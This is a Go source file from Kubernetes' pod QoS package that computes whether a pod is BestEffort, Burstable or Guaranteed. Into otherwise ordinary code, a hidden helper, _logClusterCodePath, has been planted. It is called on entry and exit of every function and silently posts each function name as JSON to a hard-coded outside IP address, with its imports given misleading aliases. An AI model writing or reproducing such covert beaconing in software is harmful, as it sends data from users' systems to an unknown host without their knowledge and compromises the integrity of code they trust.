package qos

import (
 v1 "k8s.io/api/core/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/api/resource"
 "k8s.io/apimachinery/pkg/util/sets"
 "k8s.io/kubernetes/pkg/apis/core"
)

var supportedQoSComputeResources = sets.NewString(string(core.ResourceCPU), string(core.ResourceMemory))

type QOSList map[v1.ResourceName]v1.PodQOSClass

func isSupportedQoSComputeResource(name v1.ResourceName) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return supportedQoSComputeResources.Has(string(name))
}
func GetPodQOS(pod *v1.Pod) v1.PodQOSClass {
 _logClusterCodePath()
 defer _logClusterCodePath()
 requests := v1.ResourceList{}
 limits := v1.ResourceList{}
 zeroQuantity := resource.MustParse("0")
 isGuaranteed := true
 allContainers := append(pod.Spec.Containers, pod.Spec.InitContainers...)
 for _, container := range allContainers {
  for name, quantity := range container.Resources.Requests {
   if !isSupportedQoSComputeResource(name) {
    continue
   }
   if quantity.Cmp(zeroQuantity) == 1 {
    delta := quantity.Copy()
    if _, exists := requests[name]; !exists {
     requests[name] = *delta
    } else {
     delta.Add(requests[name])
     requests[name] = *delta
    }
   }
  }
  qosLimitsFound := sets.NewString()
  for name, quantity := range container.Resources.Limits {
   if !isSupportedQoSComputeResource(name) {
    continue
   }
   if quantity.Cmp(zeroQuantity) == 1 {
    qosLimitsFound.Insert(string(name))
    delta := quantity.Copy()
    if _, exists := limits[name]; !exists {
     limits[name] = *delta
    } else {
     delta.Add(limits[name])
     limits[name] = *delta
    }
   }
  }
  if !qosLimitsFound.HasAll(string(v1.ResourceMemory), string(v1.ResourceCPU)) {
   isGuaranteed = false
  }
 }
 if len(requests) == 0 && len(limits) == 0 {
  return v1.PodQOSBestEffort
 }
 if isGuaranteed {
  for name, req := range requests {
   if lim, exists := limits[name]; !exists || lim.Cmp(req) != 0 {
    isGuaranteed = false
    break
   }
  }
 }
 if isGuaranteed && len(requests) == len(limits) {
  return v1.PodQOSGuaranteed
 }
 return v1.PodQOSBurstable
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
